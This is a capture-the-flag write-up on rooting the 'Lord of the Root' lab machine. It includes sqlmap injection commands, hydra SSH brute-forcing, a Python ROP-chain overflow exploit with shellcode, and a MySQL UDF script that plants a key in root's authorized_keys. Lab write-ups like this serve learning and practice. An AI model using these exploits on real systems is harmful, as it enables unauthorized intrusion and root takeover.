# Lord of the Root

"A box to demonstrate typical CTF strategies."

This one was easy right up to getting root on the box, which was beyond me. However, I'll document it all up plus the three strategies for root which I learned about and tested, as they represent some good learnings.

1. Scanning revealed just two ports, 22 and 1337. The latter hosted a simple static website that was lord of the rings themed.

2. Browsing to robots.txt surprisingly revealed another static page, with another image. In the source was a base64 encoded string, which when decoded gave `/978345210/profile.php`

3. On that page was a simple login form. I promptly ran `sqlmap` against it, and found the password field was injectable. Via that I ran a `--dump` and got a single table of username/passwords:

    ```
    +----+------------------+----------+
    | id | password         | username |
    +----+------------------+----------+
    | 1  | iwilltakethering | frodo    |
    | 2  | MyPreciousR00t   | smeagol  |
    | 3  | AndMySword       | aragorn  |
    | 4  | AndMyBow         | legolas  |
    | 5  | AndMyAxe         | gimli    |
    +----+------------------+----------+
    ```

4. Any of them worked on the login form, but the resulting page had nothing on it. Next step was to test it against the ssh endpoint.

5. I popped those usernames and passwords into two separate files and ran them with hydra against ssh. It popped with `smeagol:MyPreciousR00t` in a moment. I logged on and started internal enumeration.

At this point I was stuck. I found three executables, at `/SECRET/door[1-3]/file`. Running these through `gdb` revealed each took an argument, but only one would do anything with it: run it through `strcpy`. So, buffer overflow. Also, something on the machine would swap the files around every couple of minutes.

My skill with buffer overflows is non-existent. Assuming this was what I needed to skill up, I took a few days aside to learn up. However, I discovered eventually that ASLR is running on the machine, so this would require a ROP chain or something which is much more than I know how to do at the moment :( 

Eventually, totally stuck, I read some walkthroughs. Through this I learned of three ways to get root, and tested them all. I'll document them here for my learning on others.

## Method 1: ROP-chain buffer overflow

The author of this article is a genius: http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/ (look at their [ksavir](https://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/) write-up if you want to be humbled). They document two ways, specifically via MySql and the secret doors. I ignored the first because I thought (mistakingly) I had missed `suid on mysql` or `sudo -l` which I already know how to do. I hadn't, so I'll cover the mysql solution next, but the second technique they used was rop chains.

Specifically, via removing the file to his/her own machine and using more advanced debugging tools, like GEF, they managed to find non-position independent points in the file, to jump to that and then to their shell code, and finally exploit it. The following python script, when used to emit an argument for the exploitable file, will pop a root shell:

```python
import struct
def p(x):
  return struct.pack('<L', x)

def write(what, where):
  # strcpy(dest, src)
  # use strcpy+6 otherwise the address will contain a space, messes up argv
  # second address is pop2ret
  return p(0x8048326)+p(0x804850e)+p(where)+p(what)
  
z = ""
z += "A"*171
z += write(0x804852c, 0x8049330) # ff
z += write(0x8048366, 0x8049331) # e4 jmp esp
z += p(0x8049330)
# modified /bin/ash shellcode: http://shell-storm.org/shellcode/files/shellcode-547.php
z += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
z += "\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
z += "\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
z += "\x80\x31\xc0\xb0\x01\xcd\x80"

print z
```

## Method 2: MySQL dumpfile

This was a new technique that I haven't seen before, and one which I will need to remember. If mysql is running as root, and can use dumpfile or outfile, but at the same time is constrained in the directories it can reach, then you can sometimes add a udf module to mysql that allows it to break out of this jail and do things like add your public ssh key to root's auth keys list.

This also came from the blog post in the previous entry. Essentially, you grab this extension: https://github.com/mysqludf/lib_mysqludf_sys, and compile it via `gcc -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o ./lib_mysqludf_sys.so`. Then, with xxd and dump file you can load it into the local mysql installation, run a few command sql setups, then with a newfound ability to use outfile anywhere, add your public key to the root auth key list. The blog post did this all with one script:

```bash
!/bin/bash

echo "SELECT 0x" > payload
cat lib_mysqludf_sys.so |xxd -p >> payload
echo " INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exploit.so'; " >> payload
echo "DROP FUNCTION IF EXISTS sys_exec; " >> payload
echo "CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit.so'; " >> payload
echo "SELECT '" >> payload
cat ~/.ssh/id_rsa.pub >> payload
echo "' INTO OUTFILE \"/root/.ssh/authorized_keys\"; " >> payload
echo "SELECT sys_exec(\"chmod 600 /root/.ssh/authorized_keys\"); " >> payload

cat payload | tr -d '\n' > payload2
rm payload
mv payload2 payload

mysql -h 127.0.0.1 -P 13333 -u root -pcoolwater < payload
```

Note the username and password in the above were from the ksavir writeup. In Lord of the Root they used creds from the login form of the 1337 website.

### Honourable mention - sqlmap hash dump

This writeup involved a different MySql exploit: https://alexandervoidstar.wordpress.com/2016/12/04/ctf-writeup-lord-of-the-root-1-0-1/

Specifically, they revealed something I didn't know, that sqlmap can also dump system hashes: 

``` bash
sqlmap -o -u "http://192.168.56.101:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords
method=POST --level=3 --threads=10 --dbms=MySQL --dump
```

This will get in addition to the passwords above, the system user and hashes for the machine, which can then potentially be cracked. It would allow access along, but might have allowed `su` on the box maybe.

## Method 3: Ubuntu exploit

This was the simplest. I didn't get it because I usually disdain Linux version exploits. They just feel...cheap. It was pointed out in the blog post from the previous article. Anyway, `uname -a` reveals this is Ubuntu 14 running a 3.something kernel. And searching exploit-db eventually reveals: https://www.exploit-db.com/exploits/39166

Downloading the raw c code, compiling it (no special flags required) and running it pops a root shell. Easy.